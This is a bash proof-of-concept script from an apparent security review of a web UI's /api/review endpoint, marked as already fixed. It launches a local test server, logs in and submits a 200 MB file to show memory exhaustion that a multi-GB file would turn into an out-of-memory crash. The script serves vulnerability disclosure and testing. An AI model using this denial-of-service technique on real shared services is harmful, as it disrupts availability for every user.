#!/usr/bin/env bash
# FIXED before merge, found in review of the web-ui branch (web/server.py: drain, rmtree, capped).
# PoC: unbounded memory buffering on /api/review (and every escrow call).
#
# web/server.py:166  out, err = p.communicate(...)   buffers the ENTIRE escrow
# stdout in RAM, THEN web/server.py:171 slices [:MAX_OUT]. escrow prints the
# full added-file content as the diff with no total cap, so an agent-authored
# large file makes review buffer the whole diff in memory. RSS scales linearly
# with file size; a multi-GB file OOM-kills the box (one shared world, one lock
# -> takes the service down for everyone).
#
# Usage: web-review-oom.sh <escrow-web-bin> <python3-bin>  (uses a 200 MB file)
set -euo pipefail
WEB=${1:?escrow-web bin}; PY=${2:?python3 bin}
D=$(mktemp -d); trap '[ -n "${SRV-}" ] && kill "$SRV" 2>/dev/null; rm -rf "$D"' EXIT
"$PY" -I - "$D/data" "$WEB" <<'PYE'
import sys, secrets, importlib.util, subprocess, pathlib
src=subprocess.check_output(["sed","-n","s|.* \\(/nix/store/[^ ]*/server.py\\).*|\\1|p",sys.argv[2]]).decode().strip()
sp=importlib.util.spec_from_file_location("srv",src); m=importlib.util.module_from_spec(sp); sp.loader.exec_module(m)
d=pathlib.Path(sys.argv[1]); d.mkdir(parents=True,exist_ok=True); s=secrets.token_bytes(16)
(d/"users").write_text(f"t {s.hex()} {m.scrypt('poc-password-123',s).hex()}\n")
PYE
"$WEB" serve --data "$D/data" --listen 127.0.0.1:18133 >"$D/log" 2>&1 & SRV=$!
sleep 2; U=http://127.0.0.1:18133
curl -s -c "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' \
  --data-binary '{"user":"t","password":"poc-password-123"}' $U/api/login >/dev/null
"$PY" -I - > "$D/body" <<'PYE'
import json
print(json.dumps({"persona":"alice","mode":"command","text":"head -c 200000000 /dev/zero | tr '\\0' A > big.txt"}))
PYE
curl -s -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' --data-binary @"$D/body" $U/api/run > "$D/run"
RID=$("$PY" -I -c 'import json,re;print(re.search(r"proposed (\w+)",json.load(open("'"$D"'/run"))["stderr"]).group(1))')
echo "server RSS before review: $(grep VmRSS /proc/$SRV/status | awk '{print $2" "$3}')"
( for i in $(seq 1 60); do grep VmRSS /proc/$SRV/status | awk '{print $2}'; sleep 0.25; done > "$D/rss" ) & SAMP=$!
curl -s -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' \
  --data-binary "$("$PY" -I -c 'import json;print(json.dumps({"id":"'"$RID"'","persona":"bob"}))')" $U/api/review >/dev/null
wait $SAMP
echo "server RSS peak during review of a 200 MB diff: $(sort -n "$D/rss" | tail -1) kB"
echo "(linear in file size -> a multi-GB agent file OOMs the box)"
